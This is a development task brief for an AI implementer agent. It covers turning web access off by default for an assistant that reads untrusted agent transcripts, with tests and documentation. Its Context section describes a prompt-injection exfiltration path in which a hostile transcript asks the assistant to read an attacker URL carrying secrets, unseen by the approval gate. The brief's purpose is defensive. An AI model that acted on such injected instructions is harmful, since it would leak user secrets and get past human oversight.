# MAWAS-NET-GUARD — Mawas reads other agents' text, so her harness gets no web by default

Agent: implementer (Claude Sonnet 5.5)   Branch: `slice/MAWAS-NET-GUARD`

**Contract ownership:** none on the wire expected; a daemon setting. Report first if a protocol change looks necessary.

## Context
`docs/spikes/2026-10-31-advisor-network.md` (read it whole): OMP's `read`, `grep` and `glob` fetch `http(s)://` URLs and open `ssh://` connections, in every Mawas mode, without any Hutan gate. Since the 2026-10-30 wave Mawas reads other agents' transcripts, board text, reviews and history (untrusted, spike R7) — a hostile transcript can ask her to `read https://attacker/?q=<secrets>`: a prompt-injection exfiltration path that Hutan's gate never sees. MAWAS-READS also made Hutan's read tools free, so nothing slows it down.

Decision (orchestrator, boring safe default): Mawas's harness launches with web access **off** by default; an explicit setting turns it back on for users who want Mawas to read web pages.

## Items (in commit order)
1. OMP: the per-launch overlay Hutan already writes for Mawas (`omp-approvals.yml`, MAWAS-READS/WRITES) also sets `fetch.enabled: false` and web search off (the keys the spike found; verify against `omp` 18.13.3), only for Mawas launches. `ssh://` stays reachable (no key found) — document it as a residual risk; if `--tools` minus `read`/`grep`/`glob` is the only way to close it, do NOT do that by default (Mawas needs to read files) — say so in docs.
2. Claude Code / Codex Mawas launches: the documented equivalents (Claude: `disallowedTools: ["WebFetch","WebSearch"]` via the `_meta.claudeCode.options` channel MAWAS-READS used; Codex: `-c web_search="disabled"`), fixture-tested, marked unobserved in docs.
3. Setting `[assistant] web = false` (daemon setting, live at next Mawas start; Settings → Mawas row "Let Mawas read the web" with a one-line risk note). Ordinary (non-Mawas) chats are untouched.
4. Docs: `docs/control.md` § Mawas (what Mawas can reach on the network per harness and mode, the residual `ssh://` path), `docs/assistant.md`.

## Acceptance
Daemon tests: Mawas launch carries the web-off settings per harness; `web = true` removes them; non-Mawas chats unchanged. One real OMP turn on `anthropic/claude-haiku-5-5` in a scratch home with a 127.0.0.1 canary: Mawas asked to read the canary URL → no request arrives (and with `web = true` it does). `just check` green.

## Rules
Read `AGENTS.md`, `docs/process.md` (§ Implementer agents, § Definition of Done, § UI checks — note the rule that the user's own Hutan runs on this machine), `docs/spikes/2026-10-25-user-needs/README.md` and the report it cites for this need. Commit after every item (messages end `(MAWAS-NET-GUARD)`); tests wait on state; update existing tests to the new spec keeping what they prove; Cua screenshots dark + light into `~/hutan-scratch/mawasnetguard/shots/`; `just check` green at the end. Fresh `HUTAN_HOME`; no `hutand` left. Do not edit `docs/status.md`, `docs/roadmap.md`, `CHANGELOG.md`.
